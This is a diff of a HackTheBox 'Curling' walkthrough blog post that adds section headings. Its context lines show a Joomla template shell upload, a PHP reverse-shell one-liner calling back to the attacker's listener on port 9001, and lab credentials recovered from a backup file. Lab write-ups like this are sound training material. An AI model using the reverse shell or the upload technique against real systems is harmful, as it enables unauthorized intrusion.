@@ -18,6 +18,8 @@ For all the beginners and the people who wish to nail all the machines on HackTh
 
 Before following this walkthrough, I highly recommend trying to get the flag yourself! Just like you will hear from everyone else, try harder! (if you cannot find it)
 
+## Enumeration
+
 First up, we'll scan the box using basic nmap scripts and then go from there (Enumerate!).
 
 ```bash
@@ -87,6 +89,8 @@ I used `Floris:Curling2018!` to login to the administrator page and we can login
 
 ![admin]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/curling/login.png)
 
+## PHP Shell upload
+
 A little Google-Fu helped me find where I could upload files and get a shell. I am going to use the `Beez3` template.
 
 ![admin]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/curling/template.png)
@@ -103,7 +107,7 @@ I am going to try the command `id` in the parameter that we created.
 And we have command execution. Next step is to get a shell. For that, I will use `php -r '$sock=fsockopen("<my-ip>",9001);exec("/bin/sh -i <&3 >&3 2>&3");'` to connect to a `ncat` listener running on my system. I am going to URL encode this just in case the browser does not take `&` as a start of a new command.
 There we have it, a low-privilege shell.
 
-```bash
+````bash
 root@kali:~/Curling# nc -lnvp 9001
 listening on [any] 9001 ...
 connect to [my-ip] from (UNKNOWN) [10.10.10.150] 53762
@@ -134,7 +138,7 @@ $ cat password_backup
 000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c  .Y.P...HB....*..
 000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090  .G.. .U@r..rE8P.
 000000f0: 819b bb48                                ...H
-```
+````
 
 Looking aroud, we have access as `www-data` and in the home directory of the user `floris`, I see a `password_backup` file.
 I created a base64 output of the hexdump and used CyberChef to try and decode it.
@@ -143,7 +147,7 @@ I created a base64 output of the hexdump and used CyberChef to try and decode it
 
 It gave me a password `5d<wdCbdZu)|hChXll`. Let's use this password to login as `floris` using SSH.
 
-```bash
+````bash
 root@kali:~/Curling# ssh floris@10.10.10.150
 The authenticity of host '10.10.10.150 (10.10.10.150)' can't be established.
 ECDSA key fingerprint is SHA256:o1Cqn+GlxiPRiKhany4ZMStLp3t9ePE9GjscsUsEjWM.
@@ -175,9 +179,11 @@ floris@curling:~$ ls
 admin-area  password_backup  user.txt
 floris@curling:~$ cat user.txt
 6******************************b
-```
+````
 
 Excellent! We have the `user.txt` file. Now, onto root.
+
+## Privilege escalation
 
 ````bash
 floris@curling:~/admin-area$ ls -la
